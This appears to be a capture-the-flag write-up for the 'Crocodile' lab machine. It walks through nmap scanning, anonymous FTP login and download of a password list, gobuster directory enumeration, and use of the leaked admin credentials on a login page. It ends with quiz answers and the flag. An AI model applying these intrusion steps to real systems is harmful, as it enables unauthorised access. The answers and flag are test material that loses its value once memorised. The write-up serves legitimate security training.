Path: Starting Point
Module: You need to walk before you can run
Section: Crocodile
Tier: 1

#################### PWN Process ####################

	- Scanning open ports

		┌──(kali㉿kali)-[~]
		└─$ nmap -sC -sV $t 
		Starting Nmap 7.92 ( https://nmap.org ) at 2022-07-27 05:06 EDT
		Nmap scan report for 10.129.229.107
		Host is up (0.051s latency).
		Not shown: 998 closed tcp ports (conn-refused)
		PORT   STATE SERVICE VERSION
		21/tcp open  ftp     vsftpd 3.0.3
		| ftp-syst: 
		|   STAT: 
		| FTP server status:
		|      Connected to ::ffff:10.10.14.217
		|      Logged in as ftp
		|      TYPE: ASCII
		|      No session bandwidth limit
		|      Session timeout in seconds is 300
		|      Control connection is plain text
		|      Data connections will be plain text
		|      At session startup, client count was 4
		|      vsFTPd 3.0.3 - secure, fast, stable
		|_End of status
		| ftp-anon: Anonymous FTP login allowed (FTP code 230)
		| -rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
		|_-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
		80/tcp open  http    Apache httpd 2.4.41 ((Ubuntu))
		|_http-title: Smash - Bootstrap Business Template
		|_http-server-header: Apache/2.4.41 (Ubuntu)
		Service Info: OS: Unix

		Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
		Nmap done: 1 IP address (1 host up) scanned in 10.77 seconds

	- Login as anonymous user

		┌──(kali㉿kali)-[~]
		└─$ ftp -a $t 
		Connected to 10.129.229.107.
		220 (vsFTPd 3.0.3)
		230 Login successful.
		Remote system type is UNIX.
		Using binary mode to transfer files.
		ftp> ls
		229 Entering Extended Passive Mode (|||42025|)
		150 Here comes the directory listing.
		-rw-r--r--    1 ftp      ftp            33 Jun 08  2021 allowed.userlist
		-rw-r--r--    1 ftp      ftp            62 Apr 20  2021 allowed.userlist.passwd
		226 Directory send OK.
		ftp> get allowed.userlist
		local: allowed.userlist remote: allowed.userlist
		229 Entering Extended Passive Mode (|||40041|)
		150 Opening BINARY mode data connection for allowed.userlist (33 bytes).
		100% |**********************************************************************|    33      137.13 KiB/s    00:00 ETA
		226 Transfer complete.
		33 bytes received in 00:00 (0.69 KiB/s)
		ftp> get allowed.userlist.passwd
		local: allowed.userlist.passwd remote: allowed.userlist.passwd
		229 Entering Extended Passive Mode (|||48449|)
		150 Opening BINARY mode data connection for allowed.userlist.passwd (62 bytes).
		100% |**********************************************************************|    62       11.78 KiB/s    00:00 ETA
		226 Transfer complete.
		62 bytes received in 00:00 (1.16 KiB/s)
		ftp> exit
		221 Goodbye.
		                                                                                                                   
		┌──(kali㉿kali)-[~]
		└─$ ls
		allowed.userlist         Desktop    Downloads  Pictures  Templates
		allowed.userlist.passwd  Documents  Music      Public    Videos
		                                                                                                                   
		┌──(kali㉿kali)-[~]
		└─$ cat allowed.userlist
		aron
		pwnmeow
		egotisticalsw
		admin
		                                                                                                                   
		┌──(kali㉿kali)-[~]
		└─$ cat allowed.userlist.passwd 
		root
		Supersecretpassword1
		@BaASD&9032123sADS
		rKXM59ESxesUFHAd

	- Recon of webservice with gobuster

		┌──(kali㉿kali)-[~]
		└─$ gobuster dir -u http://10.129.229.107/ -w /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt -x php,html
		===============================================================
		Gobuster v3.1.0
		by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
		===============================================================
		[+] Url:                     http://10.129.229.107/
		[+] Method:                  GET
		[+] Threads:                 10
		[+] Wordlist:                /usr/share/wordlists/dirbuster/directory-list-2.3-small.txt
		[+] Negative Status codes:   404
		[+] User Agent:              gobuster/3.1.0
		[+] Extensions:              php,html
		[+] Timeout:                 10s
		===============================================================
		2022/07/27 05:37:14 Starting gobuster in directory enumeration mode
		===============================================================
		/index.html           (Status: 200) [Size: 58565]
		/login.php            (Status: 200) [Size: 1577] 
		/assets               (Status: 301) [Size: 317] [--> http://10.129.229.107/assets/]
		/css                  (Status: 301) [Size: 314] [--> http://10.129.229.107/css/]   
		/js                   (Status: 301) [Size: 313] [--> http://10.129.229.107/js/]    
		/logout.php           (Status: 302) [Size: 0] [--> login.php]                      
		/config.php           (Status: 200) [Size: 0]                                      
		/fonts                (Status: 301) [Size: 316] [--> http://10.129.229.107/fonts/] 
		/dashboard            (Status: 301) [Size: 320] [--> http://10.129.229.107/dashboard/]

		We can see there's a login.php where we can use the admin credentials we got from the ftp service

		Username: admin
		Password: rKXM59ESxesUFHAd

#################### Questions ####################

	- What nmap scanning switch employs the use of default scripts during a scan?

		-sC

	- What service version is found to be running on port 21?

		vsftpd 3.0.3

	- What FTP code is returned to us for the "Anonymous FTP login allowed" message?

		230

	- What command can we use to download the files we find on the FTP server?

		get

	- What is one of the higher-privilege sounding usernames in the list we retrieved?

		admin

	- What version of Apache HTTP Server is running on the target host?

		2.4.41

	- What is the name of a handy web site analysis plug-in we can install in our browser?

		wappalyzer

	- What switch can we use with gobuster to specify we are looking for specific filetypes?

		-x

	- What file have we found that can provide us a foothold on the target?

		login.php

################## FLAG ##################
#										 #
#    c7110277ac44d78b6a9fff2232434d16    #
#										 #
##########################################
